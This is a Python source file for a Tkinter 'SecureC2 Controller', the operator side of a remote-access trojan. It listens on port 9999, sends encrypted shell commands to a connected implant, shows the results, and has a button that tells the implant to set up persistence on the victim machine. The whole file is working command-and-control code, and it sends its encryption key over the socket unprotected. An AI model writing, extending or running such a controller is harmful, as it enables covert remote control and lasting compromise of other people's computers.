import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
from cryptography.fernet import Fernet

# === Encryption Setup ===
key = Fernet.generate_key()
cipher = Fernet(key)
print(f"[+] Share this key with client: {key.decode()}")

client_socket = None


def start_server():
    global client_socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(1)
    log("Listening for connections on port 9999...")
    client_socket, addr = server.accept()
    log(f"Connection from {addr}")
    client_socket.send(key)  # Send key on connect
    threading.Thread(target=receive_data, daemon=True).start()


def send_command():
    command = command_entry.get()
    if client_socket and command:
        encrypted = cipher.encrypt(command.encode())
        client_socket.send(encrypted)
        log(f"> {command}")
        command_entry.delete(0, tk.END)


def send_persistence_command():
    command = "__enable_persistence__"
    if client_socket:
        encrypted = cipher.encrypt(command.encode())
        client_socket.send(encrypted)
        log("[*] Sent persistence enable command.")


def receive_data():
    while True:
        try:
            encrypted_response = client_socket.recv(4096)
            if encrypted_response:
                response = cipher.decrypt(encrypted_response).decode()
                log(response)
        except Exception as e:
            log(f"[!] Error: {e}")
            break


def log(message):
    output.insert(tk.END, message + '\n')
    output.see(tk.END)

# === GUI Setup ===
root = tk.Tk()
root.title("SecureC2 Controller")

output = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=20, width=70)
output.pack(padx=10, pady=10)

command_entry = tk.Entry(root, width=60)
command_entry.pack(padx=10, pady=5)
command_entry.bind("<Return>", lambda e: send_command())

tk.Button(root, text="Send", command=send_command).pack()
tk.Button(root, text="Enable Persistence", command=send_persistence_command).pack(pady=5)

threading.Thread(target=start_server, daemon=True).start()
root.mainloop()
